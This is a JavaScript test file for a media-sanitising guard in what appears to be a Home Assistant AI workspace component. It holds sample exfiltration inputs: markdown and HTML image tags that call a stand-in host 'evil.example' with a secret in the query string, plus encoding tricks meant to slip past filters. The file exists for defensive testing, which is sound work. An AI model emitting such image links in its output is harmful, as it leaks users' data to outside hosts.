import { safeMediaUrl, stripRemoteMedia } from "../custom_components/ai_workspace/www/media_guard.js";

const HERE = "https://ha.example:8123";
let failed = 0;

function ok(cond, label) {
  if (!cond) {
    console.error("FAIL:", label);
    failed += 1;
  }
}

const strip = (text) => stripRemoteMedia(text, HERE);
const noImage = (text, label) => {
  const out = strip(text);
  ok(!/!\[/.test(out) && !/<(img|video|audio|source|iframe|embed|object|image)\b/i.test(out), `${label}: ${out}`);
};

ok(safeMediaUrl("/local/a.png", HERE), "same-origin path");
ok(safeMediaUrl("https://ha.example:8123/api/camera_proxy/camera.door", HERE), "same-origin absolute");
ok(safeMediaUrl("data:image/png;base64,AAAA", HERE), "data image");
ok(!safeMediaUrl("//evil.example/x.png", HERE), "protocol-relative");
ok(!safeMediaUrl("/\\evil.example/x.png", HERE), "backslash host");
ok(!safeMediaUrl("/&#47;evil.example/x.png", HERE), "entity slash");
ok(!safeMediaUrl("https://evil.example/x.png", HERE), "other origin");
ok(!safeMediaUrl("&#104;ttps://evil.example/x.png", HERE), "entity scheme");
ok(!safeMediaUrl("x.png", HERE), "bare relative");

noImage("![leak](https://evil.example/?q=secret)", "inline image");
noImage("![leak](https://evil.example/?q=secret 'title')", "single-quoted title");
noImage("![leak](<https://evil.example/x.png>)", "angle-bracket url");
noImage("![leak][ref]\n\n[ref]: https://evil.example/x.png", "reference image");
noImage("![leak]\n\n[leak]: https://evil.example/x.png", "shortcut reference image");
noImage("![a [b]](https://evil.example/x.png)", "nested brackets");
noImage('<img alt=">" src="https://evil.example/x.png">', "quoted > in attribute");
noImage('<img srcset="https://evil.example/x.png 1x">', "srcset only");
noImage('<IMG/src="https://evil.example/x.png">', "uppercase slash");
noImage('<video poster="https://evil.example/p.png" src="/local/v.mp4"></video>', "video poster");
noImage('<picture><source srcset="/local/a.png, https://evil.example/b.png 2x"></picture>', "mixed srcset");
noImage('<audio src="https://evil.example/a.mp3"></audio>', "audio");
noImage('<iframe src="/local/x.html"></iframe>', "iframe is always dropped");
noImage('<img src="https://evil.example/x.png', "unterminated tag");

ok(strip("![door](/api/camera_proxy/camera.door)") === "![door](/api/camera_proxy/camera.door)", "keeps local image");
ok(strip('<img src="/local/a.png" alt="a">') === '<img src="/local/a.png" alt="a">', "keeps local img tag");
ok(strip("![x](https://evil.example/x.png)") === "[x](https://evil.example/x.png)", "remote image becomes a link");
const fenced = "```html\n<img src=\"https://cdn.example/x.png\">\n![a](https://cdn.example/a.png)\n```";
ok(strip(fenced) === fenced, "fenced code stays as written");
ok(strip("`<img src=https://cdn.example/x.png>`") === "`<img src=https://cdn.example/x.png>`", "inline code stays");
noImage("```\ncode\n```\n![leak](https://evil.example/x.png)", "image after a closed fence");

if (failed) {
  console.error(`${failed} media guard check(s) failed`);
  process.exit(1);
}
console.log("media guard ok");
